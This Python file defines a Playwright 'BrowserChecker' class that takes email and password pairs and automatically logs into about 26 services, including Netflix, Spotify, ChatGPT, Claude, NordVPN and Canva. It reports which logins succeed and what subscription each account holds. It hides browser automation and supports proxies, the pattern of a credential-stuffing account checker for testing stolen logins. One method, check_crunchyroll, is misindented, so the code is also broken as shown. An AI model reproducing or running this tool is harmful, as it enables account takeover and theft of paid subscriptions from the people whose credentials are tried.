# checkers/browser_checkers.py
from playwright.async_api import async_playwright
import asyncio
from typing import Tuple, Dict, Optional
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BrowserChecker:
    def __init__(self, headless: bool = True, timeout: int = 45, proxy: Optional[str] = None):
        self.headless = headless
        self.timeout = timeout
        self.proxy = proxy

    async def _init_browser(self):
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(
            headless=self.headless,
            proxy={"server": self.proxy} if self.proxy else None,
            args=['--disable-blink-features=AutomationControlled']
        )
        context = await browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()
        return playwright, browser, page

    # STREAMING SERVICES (15)

    async def check_netflix(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.netflix.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            # Try multiple selectors
            email_selectors = ['input[name="email"]', 'input[type="email"]', '#id_userLoginId']
            for selector in email_selectors:
                if await page.locator(selector).count():
                    await page.fill(selector, email)
                    break

            password_selectors = ['input[name="password"]', 'input[type="password"]', '#id_password']
            for selector in password_selectors:
                if await page.locator(selector).count():
                    await page.fill(selector, password)
                    break

            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            # Check for successful login
            if "browse" in page.url:
                # Go to account page to check subscription
                await page.goto("https://www.netflix.com/AccountDetails")
                await page.wait_for_timeout(3000)

                page_content = await page.content()
                if "Premium" in page_content:
                    return True, "Premium 4K subscription"
                elif "Standard" in page_content:
                    return True, "Standard HD subscription"
                elif "Basic" in page_content:
                    return True, "Basic subscription"
                else:
                    return True, "Active subscription"
            elif "error" in page.url.lower() or "login" in page.url:
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Netflix check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_disney(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.disneyplus.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            # Fill email
            email_selectors = ['input[name="email"]', 'input[type="email"]', '#email']
            for selector in email_selectors:
                if await page.locator(selector).count():
                    await page.fill(selector, email)
                    break

            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            # Fill password
            password_selectors = ['input[name="password"]', 'input[type="password"]', '#password']
            for selector in password_selectors:
                if await page.locator(selector).count():
                    await page.fill(selector, password)
                    break

            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url or "browse" in page.url:
                await page.goto("https://www.disneyplus.com/account")
                await page.wait_for_timeout(3000)
                page_content = await page.content()

                if "Premium" in page_content or "Disney+" in page_content:
                    return True, "Disney+ subscription active"
                return True, "Valid account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Disney+ check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_hbomax(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.max.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            # Multiple selector attempts
            email_filled = False
            for selector in ['input[type="email"]', 'input[name="email"]', '#email']:
                if await page.locator(selector).count():
                    await page.fill(selector, email)
                    email_filled = True
                    break

            if not email_filled:
                await page.fill('input[type="text"]', email)

            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            for selector in ['input[type="password"]', 'input[name="password"]', '#password']:
                if await page.locator(selector).count():
                    await page.fill(selector, password)
                    break

            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "browse" in page.url or "home" in page.url:
                return True, "HBO Max subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"HBO Max check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_prime(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.amazon.com/ap/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('#ap_email', email)
            await page.click('#continue')
            await page.wait_for_timeout(2000)

            await page.fill('#ap_password', password)
            await page.click('#signInSubmit')
            await page.wait_for_timeout(5000)

            if "primevideo" in page.url or "prime" in page.url.lower():
                await page.goto("https://www.amazon.com/gp/primecentral")
                page_content = await page.content()
                if "Prime Video" in page_content:
                    return True, "Amazon Prime subscription active"
                return True, "Valid Amazon account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Prime Video check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_hulu(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.hulu.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url or "browse" in page.url:
                return True, "Hulu subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Hulu check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

   async def check_crunchyroll(self, email: str, password: str) -> Tuple[bool, str]:
    playwright, browser, page = await self._init_browser()
    try:
        # Increase timeout to 60 seconds
        await page.goto("https://www.crunchyroll.com/login", timeout=60000)
        await page.wait_for_timeout(5000)
        
        # Try multiple selectors for email
        email_selectors = ['input[name="email"]', 'input[type="email"]', '#login-form-email']
        for selector in email_selectors:
            try:
                if await page.locator(selector).count():
                    await page.fill(selector, email)
                    break
            except:
                continue
        
        # Try multiple selectors for password
        password_selectors = ['input[name="password"]', 'input[type="password"]', '#login-form-password']
        for selector in password_selectors:
            try:
                if await page.locator(selector).count():
                    await page.fill(selector, password)
                    break
            except:
                continue
        
        # Wait and click login
        await page.wait_for_timeout(2000)
        
        button_selectors = ['button[type="submit"]', 'input[type="submit"]', '.login-button']
        for selector in button_selectors:
            try:
                if await page.locator(selector).count():
                    await page.click(selector)
                    break
            except:
                continue
        
        # Wait longer for redirect (10 seconds)
        await page.wait_for_timeout(10000)
        
        # Check if login successful
        if "home" in page.url or "profile" in page.url:
            # Check for premium
            await page.goto("https://www.crunchyroll.com/premium")
            await page.wait_for_timeout(3000)
            page_content = await page.content()
            if "Premium" in page_content or "Mega Fan" in page_content:
                return True, "Crunchyroll Premium active"
            return True, "Free Crunchyroll account"
        elif "error" in page.url.lower() or "invalid" in (await page.content()).lower():
            return False, "Invalid credentials"
        
        return False, "Login failed"
        
    except Exception as e:
        logger.error(f"Crunchyroll check error: {e}")
        return False, f"Error: {str(e)[:50]}"
    finally:
        await browser.close()
        await playwright.stop()

    async def check_paramount(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.paramountplus.com/login/", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url:
                return True, "Paramount+ subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Paramount+ check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_peacock(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.peacocktv.com/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "browse" in page.url:
                return True, "Peacock subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Peacock check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_plex(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://app.plex.tv/auth/#!", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.click('button:has-text("Sign In")')
            await page.wait_for_timeout(1000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "dashboard" in page.url:
                return True, "Plex account active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Plex check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_starz(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.starz.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url:
                return True, "Starz subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Starz check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_mgm(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.mgmplus.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url or "browse" in page.url:
                return True, "MGM+ subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"MGM+ check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_discovery(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.discoveryplus.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url:
                return True, "Discovery+ subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Discovery+ check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_espn(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.espn.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "espn.com" in page.url and "login" not in page.url:
                return True, "ESPN+ subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"ESPN+ check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_tubi(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://tubitv.com/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url:
                return True, "Tubi account active (free)"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Tubi check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_pluto(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://pluto.tv/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "home" in page.url or "pluto.tv" in page.url:
                return True, "Pluto TV account active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Pluto TV check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # MUSIC SERVICES (3)

    async def check_spotify(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://accounts.spotify.com/en/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input#login-username', email)
            await page.fill('input#login-password', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "browse" in page.url or "home" in page.url:
                await page.goto("https://www.spotify.com/account/overview/")
                await page.wait_for_timeout(3000)
                page_content = await page.content()

                if "Premium" in page_content:
                    return True, "Spotify Premium subscription"
                else:
                    return True, "Free Spotify account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Spotify check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_youtube_music(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://accounts.google.com/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[type="email"]', email)
            await page.click('#identifierNext')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('#passwordNext')
            await page.wait_for_timeout(5000)

            if "myaccount" in page.url or "google" in page.url:
                await page.goto("https://www.youtube.com/paid_memberships")
                await page.wait_for_timeout(3000)
                page_content = await page.content()

                if "Premium" in page_content or "Music Premium" in page_content:
                    return True, "YouTube Music Premium subscription"
                else:
                    return True, "Free YouTube account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"YouTube Music check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_amazon_music(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.amazon.com/music/player", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('#ap_email', email)
            await page.click('#continue')
            await page.wait_for_timeout(2000)

            await page.fill('#ap_password', password)
            await page.click('#signInSubmit')
            await page.wait_for_timeout(5000)

            if "music" in page.url:
                await page.goto("https://www.amazon.com/gp/yourmemberships")
                page_content = await page.content()
                if "Music Unlimited" in page_content:
                    return True, "Amazon Music Unlimited subscription"
                elif "Prime Music" in page_content:
                    return True, "Amazon Prime Music included"
                else:
                    return True, "Free Amazon Music account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Amazon Music check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # AI SERVICES (4)

    async def check_chatgpt(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://chat.openai.com/auth/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.click('button[data-testid="login-with-email"]')
            await page.wait_for_timeout(1000)

            await page.fill('input[name="username"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "chat" in page.url:
                await page.goto("https://chat.openai.com/account")
                await page.wait_for_timeout(3000)
                page_content = await page.content()

                if "ChatGPT Plus" in page_content or "Plus plan" in page_content:
                    return True, "ChatGPT Plus subscription"
                else:
                    return True, "Free ChatGPT account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"ChatGPT check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_claude(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://claude.ai/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[type="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "claude.ai" in page.url and "login" not in page.url:
                return True, "Claude AI account active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Claude AI check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_perplexity(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.perplexity.ai/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[type="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "perplexity.ai" in page.url and "login" not in page.url:
                return True, "Perplexity AI account active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Perplexity check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_cursor(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://cursor.sh/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[type="email"]', email)
            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "dashboard" in page.url or "cursor.sh" in page.url:
                return True, "Cursor account active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Cursor check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # VPN SERVICES (3)

    async def check_surfshark(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://account.surfshark.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "dashboard" in page.url:
                return True, "Surfshark VPN subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Surfshark check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_nordvpn(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://my.nordaccount.com/login/", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "dashboard" in page.url:
                return True, "NordVPN subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"NordVPN check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    async def check_expressvpn(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.expressvpn.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "account" in page.url:
                return True, "ExpressVPN subscription active"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"ExpressVPN check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # PRODUCTIVITY SERVICES (1)

    async def check_canva(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.canva.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(2000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(5000)

            if "canva.com" in page.url and "login" not in page.url:
                await page.goto("https://www.canva.com/account")
                await page.wait_for_timeout(3000)
                page_content = await page.content()

                if "Pro" in page_content or "pro" in page_content.lower():
                    return True, "Canva Pro subscription"
                else:
                    return True, "Free Canva account"
            elif "error" in page.url.lower():
                return False, "Invalid credentials"

            return False, "Login failed"
        except Exception as e:
            logger.error(f"Canva check error: {e}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()
